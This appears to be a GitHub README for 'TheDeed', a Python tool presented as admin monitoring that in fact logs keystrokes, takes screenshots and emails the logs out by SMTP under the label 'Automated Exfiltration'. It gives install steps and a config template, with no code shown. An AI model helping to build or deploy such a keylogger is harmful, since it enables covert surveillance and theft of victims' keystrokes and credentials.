# TheDeed - Security & Monitoring System

A Python-based administrative monitoring system designed to log system activity, track operational events, and provide automated email alerts.

## ⚠️ Disclaimer
**This project is intended strictly for authorized educational purposes, security research, or administrative monitoring on systems you own or have explicit permission to audit. Unauthorized deployment or use of this software to monitor users without their consent is illegal and a violation of privacy laws.**

## ✨ Features
* **Activity Logging:** Records system state and events into local security logs.
* **Keystroke Archiving:** Captures internal inputs to audit administrative workflows.
* **Periodic Evaluation:** Runs continuous, configurable monitoring cycles.
* **Automated Exfiltration:** Sends log files safely over secure SMTP (TLS) channels.

## 🚀 Getting Started

### Prerequisites
* Python 3.8 or higher
* A secure SMTP-capable email account (e.g., Gmail with an App Password)

### Installation
1. Clone the repository:
   ```bash
   git clone https://github.com/yourusername/TheDeed.git
   cd TheDeed
   ```

2. Install the required dependencies:
   ```bash
   pip install pyautogui pillow pyscreeze
   ```
   *Note: If you run into Pillow or screenshot compatibility errors on newer Python versions, run:*
   ```bash
   pip install --upgrade --only-binary :all: pillow pyscreeze pyautogui
   ```

## ⚙️ Configuration
The application relies on an initialization configuration file. **Never commit your plaintext credentials to GitHub.**

1. Create a `config.ini` file in the root directory.
2. Structure it as follows:

```ini
[general]
check_interval = 20
log_file_path = assets/logs/security_log.txt
key_l0GG_file_path = assets/logs/K_log.txt
screen_shots_path = assets/screenshots/

[email]
SENDER_EMAIL = your-email@gmail.com
APP_PASSWORD = your-app-password
RECEIVER_EMAIL = receiver-email@gmail.com
SMTP_SERVER = smtp.gmail.com
SMTP_PORT = 587

[settings]
debug = true
log_level = INFO
```

### 🔒 Security Best Practices
* **Ignore Configuration Files:** Add `config.ini` to your `.gitignore` to prevent leaking private credentials or App Passwords.
* **Revoke Leaked Tokens:** If an App Password is ever accidentally pushed to a public repository, revoke it immediately via your Google Account security panel.

## 💻 Usage
Run the main script from your terminal:
```bash
python main.py
```
